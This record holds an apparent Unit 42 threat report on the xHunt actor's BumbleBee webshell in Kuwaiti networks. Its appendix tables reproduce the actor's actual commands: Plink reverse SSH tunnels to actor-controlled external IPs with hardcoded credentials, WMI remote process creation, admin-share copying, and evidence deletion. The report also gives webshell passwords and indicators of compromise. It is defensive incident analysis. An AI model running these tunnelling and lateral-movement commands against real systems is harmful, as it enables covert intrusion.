{
    "id": "cfb8f16a-f556-45aa-84fe-8e92139cb70d",
    "created_at": "2022-10-25T16:48:14.214654Z",
    "updated_at": "2025-03-27T02:16:04.531865Z",
    "deleted_at": null,
    "sha1_hash": "61a27be290976447f72c35a58fb1b76481b08adb",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-01-12T01:59:10Z",
    "file_modification_date": "2021-01-12T01:59:10Z",
    "file_size": 1928023,
    "plain_text": "# xHunt Campaign: New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement\n\n**[unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign](https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/)**\n\nJanuary 11, 2021\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nJanuary 11, 2021 at 12:01 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [BumbleBee,](https://unit42.paloaltonetworks.com/tag/bumblebee/) [remote desktop,](https://unit42.paloaltonetworks.com/tag/remote-desktop/) [webshell,](https://unit42.paloaltonetworks.com/tag/webshell/) [xHunt](https://unit42.paloaltonetworks.com/tag/xhunt/)\n\n[This post is also available in: 日本語 (Japanese)](https://unit42.paloaltonetworks.jp/bumblebee-webshell-xhunt-campaign/)\n\n## Executive Summary\n\nIn September 2020, we began investigating a Microsoft Exchange server at a Kuwaiti organization\nthat a threat group compromised as part of a continued xHunt campaign. This investigation resulted\n[in the discovery of two new backdoors called TriFive and Snugy, which we discussed in a prior blog,](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nas well as a new webshell that we call BumbleBee that we will explain in greater detail in this blog.\nWe use this name because the color scheme of the BumbleBee webshell includes white, black and\nyellow, as seen in Figure 1.\n\nThe actor used the BumbleBee webshell to upload and download files to and from the compromised\nExchange server, but more importantly, to run commands that the actor used to discover additional\nsystems and to move laterally to other servers on the network. We found BumbleBee hosted on an\ninternal Internet Information Services (IIS) web server on the same network as the compromised\nExchange server, as well as on two internal IIS web servers at two other Kuwaiti organizations. As\n\n\n-----\n\n[mentioned in our prior xHunt Campaign blog, we still do not know the initial infection vector used](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nto compromise the Exchange server, as this appears to have occurred prior to the logs we were able\nto collect.\n\nWe observed the actor interacting directly with the BumbleBee webshell on the compromised\nExchange server of the Kuwaiti organization, as this server was accessible from the internet. The\nactor used Virtual Private Networks (VPNs) provided by Private Internet Access when directly\naccessing BumbleBee on internet-accessible servers. The actor would frequently switch between\ndifferent VPN servers to change the external IP address of the activity that the server would store in\nthe logs. Specifically, the actor changed the IP address to appear to be from different countries,\nincluding Belgium, Germany, Ireland, Italy, Luxembourg, the Netherlands, Poland, Portugal,\nSweden and the United Kingdom. We believe this is an attempt to evade detection and make\nanalysis of the malicious activities more difficult. We also observed the actor switching between\ndifferent operating systems and browsers, specifically Mozilla Firefox or Google Chrome on\nWindows 10, Windows 8.1 or Linux systems. This suggests the actor has access to multiple systems\nand uses this to make analysis of the activities more difficult, or that there are multiple actors\ninvolved, who have differing preferences for operating systems and browsers.\n\nIn addition to using VPNs, the actor used SSH tunnels to interact with BumbleBee webshells hosted\non internal IIS web servers that are not accessible directly from the internet at all three Kuwaiti\norganizations. The commands executed on the servers via BumbleBee suggest that the actor used the\nPuTTY Link (Plink) tool to create SSH tunnels to access services internal to the compromised\nnetwork. We observed the actor using Plink to create an SSH tunnel for TCP port 3389, which\nsuggests that the actor used the tunnel to access the system using Remote Desktop Protocol (RDP).\nWe also observed the actor creating SSH tunnels to internal servers for TCP port 80, which suggests\nthe actor used the tunnel to access internal IIS web servers. We believe that the actor accessed these\nadditional internal IIS web servers to leverage file uploading functionality in internal web\napplications to install BumbleBee as a method of lateral movement.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from these xHunt-related](https://www.paloaltonetworks.com/network-security/next-generation-firewall)\n[attacks with Threat Prevention,](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention) [URL Filtering and DNS Security subscriptions.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\n\n## BumbleBee Webshell\n\nThe threat group involved in the xHunt campaign compromised an Exchange server at a Kuwaiti\norganization and installed a webshell that we call BumbleBee. We call the webshell BumbleBee\nbecause the color scheme of the webshell includes white, black and yellow, as seen in Figure 1.\nBumbleBee is pretty straightforward. It allows an attacker to execute commands and upload and\ndownload files to and from the server. The interesting part of BumbleBee is that it requires an actor\nto supply one password to view the webshell and a second password to interact with the webshell.\n\n\n-----\n\nFigure 1. BumbleBee webshell used by xHunt actor to run commands on Microsoft Exchange Server.\n\nTo view the BumbleBee webshell, the actor must provide a password in a URL parameter named\nparameter. Otherwise, the form used to interact with BumbleBee will not display in the browser. To\ncheck the supplied password for authentication, the webshell will generate an MD5 hash of the\nparameter value and check it with a hardcoded MD5 hash, which in the BumbleBee sample hosted\non the compromised Exchange server we observed was an MD5 hash of\n1B2F81BD2D39E60F1E1AD05DD3BF9F56 for the password string fkeYMvKUQlA5asR. Once\ndisplayed, BumbleBee provides the actor three main functionalities:\n\n1. Executing commands via cmd /c\n2. Uploading files to the server to a specified folder (c:\\windows\\temp by default).\n3. Download files from the server.\n\nTo carry out any of these functions, the actor must supply a second password (in the field with the\nadded “password” label in Figure 1). The BumbleBee webshell will generate an MD5 hash of the\npassword and check it with a hardcoded MD5 hash before carrying out the functionality. The MD5\nhash checked prior to carrying out the actor’s desired actions was\n36252C6C2F616C5664A54058F33EF463, but we were unfortunately unable to determine the string\nform of this password. While we did not know the password required to use BumbleBee’s\nfunctionality, we were able to determine the commands executed via the webshell by analyzing logs\nfrom the compromised Exchange server, which we will discuss in detail in a later section of this blog.\n\nWhile carrying out our analysis, we found a second BumbleBee webshell that contained different\nMD5 hashes for viewing the webshell and executing commands, which were\nA2B4D934D394B54672EA10CA8A65C198 and 28D968F26028D956E6F1199092A1C408,\nrespectively. We determined that the hash of A2B4D934D394B54672EA10CA8A65C198 was for the\npassword TshuYoOARg3fndI, but we were unable to determine the string for the second hash. This\nwebshell was hosted at an internal IIS web server at the same Kuwaiti organization where the\noriginal BumbleBee was found on a compromised Exchange server. We also found this specific\nBumbleBee sample hosted on internal IIS web servers at two other organizations in Kuwait. We\n\n\n-----\n\nwere able to collect endpoint logs from an internal IIS web server at one of the two Kuwaiti\norganizations to determine the commands executed via BumbleBee, which we will also discuss in a\nlater section of this blog.\n\n## Interactions With Compromised Microsoft Exchange Server\n\nTo determine the actor’s activities regarding the compromised Exchange server of a Kuwaiti\norganization, we collected IIS server logs from the Exchange server and the logs generated for the\nsystem by Cortex XDR. Within the IIS logs, we were able to observe the HTTP POST requests\ngenerated when the actor issued commands via the BumbleBee webshell installed on the\ncompromised Exchange server. Using the IIS logs, we were also able to observe the actor logging\ninto a compromised email account via Outlook Web App and carrying out specific activities once\nlogged in, such as viewing emails and searching for other email accounts on the compromised\nnetwork.\n\nUnfortunately, the compromised Exchange server cannot log the data within the POST requests, so\nwhile we know how many commands were issued from these logs, we do not know the actual\ncommands that the actor executed. Also, we were only able to collect 34 days’ worth of logs from the\nperiod between Jan. 31, 2020, and Sept. 16, 2020, which did not include all the IIS logs from the\ncompromised Exchange server. Due to these large gaps in logs, we do not have a complete picture of\nthe activity or even visibility into the beginning of the actor’s interactions with the compromised\nExchange server. For example, the IIS logs show the first BumbleBee webshell activity on Feb. 1,\n2020, but they also show the TriFive backdoor logging into a compromised email account every five\nminutes starting at 12:02 AM UTC on Jan. 31, 2020. The TriFive beacons every five minutes suggest\nit was repeatedly running via the scheduled task discussed in our previous blog on the backdoors\nrelated to this incident, which also suggests that the actor had already gained sustained access to the\ncompromised Exchange server before what our collected logs show.\n\nUsing the IIS logs we were able to collect from the compromised Exchange server, we were able to\nput together a timeline of the actor’s activity, including interactions with the BumbleBee webshell.\nOn Feb. 1 and July 27, 2020, the actor logged into the Exchange server via Outlook Web App using\ncompromised credentials. The actor used the search functionality within Outlook Web App to search\nfor email addresses, including searching for the domain name of the compromised Kuwaiti\norganization to get a full list of email addresses, as well as specific keywords, such as helpdesk. We\nalso saw the actor viewing emails in the compromised account’s inbox, specifically emails from\nservice providers and technology vendors. Additionally, the actor viewed alert emails from a\nSymantec product and Fortinet’s FortiWeb product. The act of searching for emails to the helpdesk\nand viewing security alert emails suggests that the threat actor was interested in determining\nwhether the Kuwaiti organization had become aware of the malicious activities.\n\nIn regard to the BumbleBee webshell activity, the important pieces of information in the IIS logs\nused to generate a timeline were:\n\nTimestamp of the HTTP requests.\nActor’s IP address.\nUser-agent in HTTP request provides the actor’s operating system and browser version.\nClientId in the URL parameters is a unique identifier for the client provided by the Exchange\nserver via a server-side cookie.\n\nTable 1 in the Appendix provides the timeline of activity regarding the actor’s use of the BumbleBee\nwebshell, which began on Feb. 1, 2020, according to the logs we were able to collect. While creating\nthis timeline, we noticed a few interesting observables and behaviors exhibited by the actor when\n\n\n-----\n\ninteracting with BumbleBee, including:\n\nAll but one of the IP addresses used by the actor are associated with a VPN provided by Private\nInternet Access, with the other IP address belonging to FalcoVPN.\nThe actor switched between VPN servers in different locations to change IP address and to\nappear to originate from different countries, specifically Belgium, Germany, Ireland, Italy,\nLuxembourg, the Netherlands, Poland, Portugal, Sweden and the United Kingdom.\nThe actor used a combination of operating systems and browsers when interacting with\n\nBumbleBee, specifically FireFox ( ) or Chrome ( ) on Windows 10 ( ),\n\nWindows 8.1 ( ) or Linux systems ( ).\n\n## Commands Executed via BumbleBee\n\nAs we previously mentioned, the compromised Exchange server of a Kuwaiti organization does not\nlog the POST data within the IIS logs, so we were unable to extract the commands run on the\nBumbleBee webshell. However, we used overlapping timestamps to correlate the activity in the IIS\nlogs with the command prompt activity seen in Cortex XDR logs to determine the commands\nexecuted on the server. Unfortunately, we did not have visibility into the commands executed on\nBumbleBee until Sept. 16, 2020, when Cortex XDR was installed on the compromised Exchange\nserver in response to the suspicious activity. We were also able to determine the commands run on\nthe BumbleBee webshell hosted on the internal IIS web server at one of the two other Kuwaiti\norganizations as well.\n\nBased on the Cortex XDR logs, the actor spent three hours and 37 minutes on Sept. 16, 2020,\nrunning commands via the BumbleBee webshell installed on the compromised Exchange server.\nTable 2 in the Appendix shows all the commands and the MITRE ATT&CK technique identifiers that\nbest describe the activities carried out. The commands show the actor:\n\n[1. Performing network discovery (T1018) using ping and net group commands, as well as](https://attack.mitre.org/techniques/T1018/)\n\n[PowerShell (T1059.001), to find additional computers on the network.](https://attack.mitre.org/techniques/T1059/001/)\n[2. Performing account discovery (T1087) using the whoami and quser commands.](https://attack.mitre.org/techniques/T1087/)\n[3. Determining the system time (T1124) using the W32tm and time commands.](https://attack.mitre.org/techniques/T1124/)\n[4. Creating an SSH tunnel (T1572) using Plink (RTQ.exe) to a remote host.](https://attack.mitre.org/techniques/T1572/)\n\n[5. Using RDP (T1021.001) over the SSH tunnel to control the compromised computer.](https://attack.mitre.org/techniques/T1021/001/)\n[6. Laterally moving (T1570) to another system by mounting a shared folder, copying Plink](https://attack.mitre.org/techniques/T1570/)\n\n(RTQ.exe) to a remote system and using Windows Management Instrumentation (WMI)\n[(T1047) to create an SSH tunnel for RDP access.](https://attack.mitre.org/techniques/T1047/)\n[7. Removing evidence of their presence by deleting (T1070.004) BumbleBee after they were done](https://attack.mitre.org/techniques/T1070/004/)\n\nissuing commands.\n\nThe commands listed in Table 2 in the Appendix also show the actor using Plink (RTQ.exe) to create\nan SSH tunnel to an external IP address 192.119.110[.]194, as seen in the following command:\n\necho y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R 0.0.0.0:8081:<redacted IP #2>:3389 -l\nbor -pw 123321 -P 443\n\nThe IP address overlaps with other related infrastructure that we will discuss in a later section of this\nblog. Most importantly, the username and password of bor and 123321 used to create the SSH\ntunnel overlaps directly with prior xHunt activity. These exact credentials were listed within the\n\n\n-----\n\n[cheat sheet found within the Sakabota tool, which provided an example command that the actor](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\ncould use to create SSH tunnels using Plink. We believe the actor used the example command from\nthe cheat sheet as a basis for the commands they used to create the SSH tunnels via BumbleBee.\n\nThe actor creates these SSH tunnels to connect to non-internet accessible RDP services on the\nWindows system, specifically to use RDP to interact with the compromised system and to use\nGraphical User Interface (GUI) applications. The actor also uses these SSH tunnels to move laterally\nto other systems on the network, specifically to access internal systems that are not remotely\naccessible from the internet, as depicted in Figure 2.\n\nFigure 2. Visualization of xHunt actor accessing an internal system from an SSH tunnel created on the internet\n\naccessible server hosting BumbleBee.\n\nIn addition to analyzing commands executed on the compromised Exchange server, we also\nanalyzed the commands executed on the BumbleBee webshell at an internal IIS web server hosted at\none of the two other Kuwaiti organizations. On Sept. 10, 2020, we found that the actor ran several\ncommands to perform network and user account discovery. Additionally, the actor used BumbleBee\nto upload a second webshell with a filename of cq.aspx. The actor used this second webshell to run a\nPowerShell script that issued SQL queries to a Microsoft SQL Server database.\n\nThe actor first issued a SQL query to check the version of SQL server, followed by the actor issuing\ntwo additional queries that were very specific to the web application running on the IIS web server.\nThe PowerShell script used to issue the SQL queries is very similar to scripts that were included in a\n[Microsoft Technet forum post titled Running SQL via PowerShell, which suggests the actor may](https://social.technet.microsoft.com/Forums/ie/en-US/603af83a-8db5-48ce-b19c-74a823ebbece/running-sql-via-powershell?forum=winserverpowershell)\nhave used this forum post as a basis for the PowerShell script. We were unable to obtain the second\nwebshell, as the actor deleted it via the BumbleBee webshell when they were finished. Table 3 in the\nAppendix shows the commands executed via BumbleBee on Sept. 10, 2020.\n\nThe logs on the IIS web server hosting the BumbleBee webshell used to issue the commands in Table\n3 only included internal IP addresses for the source of the activity. The internal IP addresses\nsuggested this web server was not publicly accessible and did not expose the actor’s source IP\naddress. However, all of the attempts to access BumbleBee and run the commands in Table 3 had\n192.119.110[.]194:8083 as the host in the URL of the referrer field within the web server logs. This\nexternal IP address in the referrer field suggests that the actor was accessing BumbleBee via an SSH\ntunnel. The IP address in the referrer field is also the same as in the command issued to create the\nSSH tunnels for RDP access that we observed on the compromised Exchange server, as shown in\nTable 2.\n\n## File Uploader and SSH Tunnels\n\n\n-----\n\nDuring our research, we found a second BumbleBee webshell that was hosted on an internal IIS web\nserver at the initial Kuwaiti organization, as well as on internal IIS web servers at two other Kuwaiti\norganizations. This BumbleBee webshell had different passwords to view and run commands\ncompared to the first sample we analyzed. The second BumbleBee webshell required the actor to\ninclude the password TshuYoOARg3fndI within a URL parameter aptly named parameter. As with\nthe initial BumbleBee sample, we do not know the password the actor must include to be able to run\ncommands on the webshell.\n\nBy analyzing artifacts on the internal IIS web server, we were able to determine that on July 16,\n2020, the actor ran similar commands to create SSH tunnels using Plink as those seen in Table 2 in\nthe Appendix. We determined the actor executed commands that use the same username and\n[password as seen in the xHunt cheat sheet, but with a different external IP address controlled by the](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\nactor, as in the following:\n\n1.exe 142.11.211[.]79 -C -R 0.0.0.0:8080:10.x.x.x:80 -l bor -pw 123321 -P 443\nSVROOT.exe 142.11.211[.]79 -C -R 0.0.0.0:8081:10.x.x.x:80 -l bor -pw 123321 -P 443\n\nThese commands differ from those used to create the SSH tunnel on the compromised Exchange\nserver that allowed the actor to connect to the server using RDP over TCP port 3389. The commands\nabove attempt to create a tunnel to allow the actor to access web servers hosted at other internal\nservers over TCP port 80. We believe the actor used these SSH tunnels to gain access to web servers\non other internal networks with hopes of finding similar file uploading functionality on those\nservers. If found, we believe the actor would use the file uploading functionality to upload a webshell\nto compromise the remote server for lateral movement.\n\nWe checked the IIS logs that contained BumbleBee webshell activity and found three external IP\naddresses within the URLs of the referrer field of inbound HTTP requests. The presence of these IP\naddresses in the referrer field suggests that the actor used the SSH tunnels to access the web servers\nby including the following IP and TCP ports in the URL field of their browser:\n\n142.11.211[.]79:8080\n\n142.11.211[.]79:8081\n\n91.92.109[.]59:1234\n\n91.92.109[.]59:1255\n\n91.92.109[.]59:1288\n\n91.92.109[.]59:1289\n\n192.119.110[.]194:8083\n\n## Related xHunt Infrastructure\n\nThe inbound requests to the BumbleBee webshell hosted on the compromised Exchange server did\nnot provide any decent pivot points to other xHunt infrastructure, as all the external IP addresses\nwere of VPN servers the actor used when interacting with the webshell. Fortunately, we were able to\nextract known xHunt infrastructure used as the remote servers for the SSH tunnels that the actor\ncreated to access systems via RDP and internal web services. The three external servers used for the\nSSH tunnels were 192.119.110[.]194, 142.11.211[.]79 and 91.92.109[.]59, which provided overlaps\nwith other infrastructure seen in the chart in Figure 3.\n\n\n-----\n\nFigure 3. Infrastructure associated with xHunt servers used for SSH tunnels.\n\nThese three IP addresses used for the remote location of the SSH tunnel resolved to the domains\nns1.backendloop[.]online and ns2.backendloop[.]online. More recently, these two domains have\nresolved to an IP address of 192.255.166[.]158, which may suggest that the actor is using a server at\nthis IP address in current operations. The 91.92.109[.]59 IP address also resolved to various\nsubdomains on the following domains, suggesting that they are also part of the actor’s\ninfrastructure:\nbackendloop[.]online\nbestmg[.]info\nwindowsmicrosofte[.]online\n\nThe domain windowsmicrosofte[.]online contains the substring microsofte, which was seen in the\nHisoka C2 domain of microsofte-update[.]com as mentioned in our initial publication on xHunt’s\nattacks on Kuwaiti shipping and transportation organizations. Unfortunately, we have not seen any\nof these domains used by the actor within our telemetry, so we cannot determine their purpose\nwithin the actor’s operations.\n\n## Conclusion\n\n\n-----\n\nThe xHunt campaign continues as the actor installed a webshell we call BumbleBee on a\ncompromised Exchange server of a Kuwaiti organization, which we found hosted on an internal IIS\nweb server on the same network. We also discovered BumbleBee on two internal IIS web servers at\ntwo other Kuwaiti organizations as well. While we know the actor used the file uploading\nfunctionality of a web application to install BumbleBee onto internal IIS web servers, we are still\nunsure if the actor installed BumbleBee on the compromised Exchange server by exploiting a\nvulnerability or by moving laterally from another system on the network.\n\nThe actor used BumbleBee to run commands on the compromised servers at the three Kuwaiti\norganizations, including commands to discover user accounts and other systems on the network, as\nwell as commands to move laterally to other systems on the network. Additionally, the actor created\nSSH tunnels to access systems via RDP and to access internal web servers from external servers\ncontrolled by the actor. The actor used the same username and password for the SSH tunnels that\n[we observed within the cheat sheet included in the Sakabota tool, which was developed and](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\nexclusively used by the actor.\n\nThe external servers used by the actor for the SSH tunnels were seen in activity at two of the three\nKuwaiti organizations, which suggests this actor reuses infrastructure when interacting with\nmultiple target networks. These external servers also resolved to several related domains, suggesting\nthat they are not only used to establish SSH tunnels, but used more generally for infrastructure\nacross other portions of their operations.\n\nFrom this analysis, we determined that the actor prefers to use VPNs provided by Private Internet\nAccess when interacting directly with the targeted networks to conceal their true location. The actor\nwould also switch VPN servers often while issuing commands on the webshell to make the activity\nappear to originate in many different countries. The actors also used a VPN when logging into\ncompromised email accounts on the Exchange server of the Kuwaiti organization, in which they\nspecifically looked for helpdesk-related emails and emails generated by security alerts. The attempts\nto conceal their location and the focus on viewing emails that might notify administrators of the\ncompromised network of the attacker’s presence may explain how the actor was able to maintain a\npresence on the compromised network for many months.\n\nPalo Alto Networks Next-Generation Firewall customers are protected from the attacks outlined in\nthis blog with the following security subscriptions:\n\nThreat Prevention signatures “BumbleBee Webshell File Detection” and “BumbleBee Webshell\nCommand and Control Traffic Detection” detects BumbleBee webshell activity.\nActor’s related infrastructure has been categorized as malicious in URL Filtering and DNS\nSecurity.\n\n## Additional Resources\n\n Appendix\n\n**Indicators of Compromise**\n\nbackendloop[.]online\n\nbestmg[.]info\n\nwindowsmicrosofte[.]online\n\n**BumbleBee Webshell Activity on Exchange Server**\n\n\n-----\n\n**Start**\n**Time**\n\n**(UTC)**\n\n2/1/20\n10:47\n\n2/1/20\n11:37\n\n2/1/20\n12:38\n\n2/1/20\n12:58\n\n6/28/20\n11:09\n\n7/25/20\n7:56\n\n7/25/20\n10:44\n\n7/25/20\n13:59\n\n7/26/20\n6:43\n\n7/26/20\n7:41\n\n7/26/20\n11:26\n\n7/27/20\n4:52\n\n7/27/20\n10:31\n\n9/6/20\n10:58\n\n9/8/20\n6:37\n\n\n**Commands** **IP Address** **Client ID** **OS and**\n**Browser**\n**from User**\n**Agent**\n\n0 77.243.191[.]20 POQSBWBKAHZLRWNZFVPG\n\n12 185.220.70[.]144 RCWIWFL0MCDGZKGO0A\n\n0 193.176.86[.]134 RCWIWFL0MCDGZKGO0A\n\n75 82.102.21[.]219 NCHOOJMDGUYAOWZVXJQDG\n\n3 89.26.241[.]70 ITKVJLNUKULNR0PBAWQ\n\n0 23.92.127[.]18 IJFHUUAID0FGS9YQEMHCG\n\n15 196.52.84[.]35 IJAJGSWXUWVDVMMUHQQ\n\n7 196.52.84[.]52 IJAJGSWXUWVDVMMUHQQ\n\n3 185.220.70[.]139 IJAJGSWXUWVDVMMUHQQ\n\n4 185.230.127[.]233 IJAJGSWXUWVDVMMUHQQ\n\n5 185.230.127[.]239 IJAJGSWXUWVDVMMUHQQ\n\n1 193.176.86[.]170 IJAJGSWXUWVDVMMUHQQ\n\n3 212.102.52[.]134 IJAJGSWXUWVDVMMUHQQ\n\n0 212.102.35[.]102 IIARASUWFCYUBMI0NA\n\n24 196.52.84[.]30 QAFCNW0FN0ENKWGZPEPVW\n\n\n-----\n\n9/8/20\n8:22\n\n9/8/20\n8:48\n\n9/8/20\n11:40\n\n9/8/20\n13:31\n\n9/9/20\n5:57\n\n9/10/20\n18:58\n\n9/12/20\n7:13\n\n9/12/20\n10:29\n\n9/15/20\n0:04\n\n9/15/20\n5:28\n\n9/15/20\n10:45\n\n9/15/20\n11:24\n\n9/15/20\n13:24\n\n9/15/20\n13:30\n\n9/15/20\n14:49\n\n9/15/20\n15:13\n\n\n0 185.230.127[.]238 HKPBNWFKIYLNWUGAHJA\n\n0 185.230.127[.]238 <several unique>\n\n9 185.230.127[.]238 QAFCNW0FN0ENKWGZPEPVW\n\n1 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n24 195.181.170[.]242 QAFCNW0FN0ENKWGZPEPVW\n\n26 89.238.137[.]37 QAFCNW0FN0ENKWGZPEPVW\n\n2 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n7 92.223.89[.]137 QAFCNW0FN0ENKWGZPEPVW\n\n2 85.203.46[.]99 OWITUR9UOKSZPXDKFBW\n\n5 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n1 77.243.191[.]20 VOICHQVTFKIDXTCAKA\n\n4 92.223.89[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n6 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n3 92.223.89[.]136 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n\n-----\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:24\n\n9/15/20\n15:24\n\n9/16/20\n5:32\n\n9/16/20\n13:42\n\n9/16/20\n14:33\n\n9/16/20\n14:34\n\n9/16/20\n15:44\n\n9/16/20\n16:15\n\n9/16/20\n16:17\n\n9/16/20\n17:21\n\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n1 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n7 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n56 84.17.55[.]68 YEHIZAWKCLYFMDS9Q\n\n6 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n0 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n9 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n52 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n2 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n13 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n1 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n\n_Table 1. Actor activity using BumbleBee webshell on compromised Exchange server._\n\n**Commands Executed via BumbleBee on Exchange Server**\n\n\n**Time**\n**(UTC) on**\n**9/16/2020**\n\n\n**Command Executed** **ATT&CK**\n**IDs**\n\n\n13:42:12 ping -n 1 -a <redacted IP #1> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n13:42:27 quser /server:dc.<redacted root domain> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n-----\n\n14:27:39 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n14:27:51 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n14:29:06 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n14:34:25 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n14:36:57 echo y | echo q | echo y | echo q | echo y | echo q |echo y | echo q |\necho y | echo q | echo y | echo q | time\n\n14:37:11 echo y | echo q | echo y | echo q | echo y | echo q |echo y | echo q |\necho y | echo q | echo y | echo q | time\n\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n\n14:43:34 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:43:53 quser /server:<redacted IP #2> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:49:14 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:49:33 quser <redacted username #1> /server:<redacted hostname #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n15:43:13 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n15:43:21 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n15:44:53 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n\n15:45:15 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P 443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:45:26 whoami [T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n15:45:32 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P 443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:46:11 c:\\windows\\temp\\RTQ.exe [T1059.003](https://attack.mitre.org/techniques/T1059/003/)\n\n15:46:21 whoami /priv [T1033](https://attack.mitre.org/techniques/T1033/)\n\n15:48:15 net group “Domain Computers” /domain [T1069](https://attack.mitre.org/techniques/T1069/)\n\n15:48:35 ping -n 1 <redacted hostname #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n15:49:30 net use \\<redacted IP #3>\\C$ /user:<redacted domain>\\<redacted\nusername #2> <redacted password #1>\n\n15:50:22 copy c:\\windows\\temp\\RTQ.exe \\<redacted IP\n#3>\\C$\\windows\\temp\\RTQ.exe\n\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n[T1560,](https://attack.mitre.org/techniques/T1570/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:50:28 \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe [T1059.003,](https://attack.mitre.org/techniques/T1059/003/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:51:59 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c c:\\windows\\temp\\RTQ.exe >> C:\\windows\\temp\\r.txt”\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:52:22 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n15:53:36 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8082:<redacted IP #2>:3389 -l bor -pw 123321 -P 443”\n\n15:55:14 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8084:0.0.0.0:3389 -l bor -pw 123321 -P 443”\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:56:55 del \\<redacted IP #3>\\C$:\\windows\\temp\\RTQ.exe [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:57:03 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe 